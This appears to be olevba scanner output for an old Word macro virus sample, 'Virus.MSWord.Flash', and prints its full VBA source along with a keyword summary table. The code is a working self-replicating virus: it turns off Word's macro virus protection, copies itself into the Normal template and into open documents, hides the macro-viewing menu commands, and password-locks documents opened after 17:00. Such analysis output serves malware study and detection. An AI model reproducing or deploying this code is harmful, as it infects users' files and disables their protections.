olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Flash
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Flash - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Flash.bas 
in file: Virus.MSWord.Flash - OLE stream: 'Macros/VBA/Flash'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
inf 'Ïðèâåò Ñåðåãå ýêîíîìèñòó !
ini 'ïîñìîòðè íà ýòîãî ñîðöà ïîâíèìàòåëüíåå !
End Sub
Sub inf()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

Application.UserName = "(C)Copyleft by SaNDMaN #7 For Anna"
Application.UserInitials = "Flash"
Application.UserAddress = "Ufa-XXXX"

For i = 1 To NormalTemplate.VBProject.VBComponents.Count
t = NormalTemplate.VBProject.VBComponents(i)
If t = "Flash" Then NormInst = 1
Next

For a = 1 To ActiveDocument.VBProject.VBComponents.Count
e = ActiveDocument.VBProject.VBComponents(a).Name
If e = "Flash" Then DocInst = 1
Next

If NormInst = 0 Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="Flash", _
Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save
End If

If DocInst = 0 Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, Name:="Flash", _
Object:=wdOrganizerObjectProjectItems
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End Sub
Sub ini()
If Minute(Now()) = 13 And Hour(Now()) = 13 Then MsgBox "Flura-2000", vbCritical, "About crazy girl"
If Minute(Now()) = 0 And Hour(Now()) = 10 Then Selection.TypeText Text:="(c)Copyleft by SaNDMaN #7"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub AutoOpen()
If Hour(Now()) >= 17 Then
ActiveDocument.Protect Password:="Lunatic Calm", NoReset:=False, _
Type:=wdAllowOnlyComments
End If
End Sub
Sub toolsmacro()
End Sub
Sub viewvbcode()
End Sub
Sub fileprint()
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
ActiveDocument.SaveAs FileName:=Dialogs(wdDialogFileSaveAs).Type
inf
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

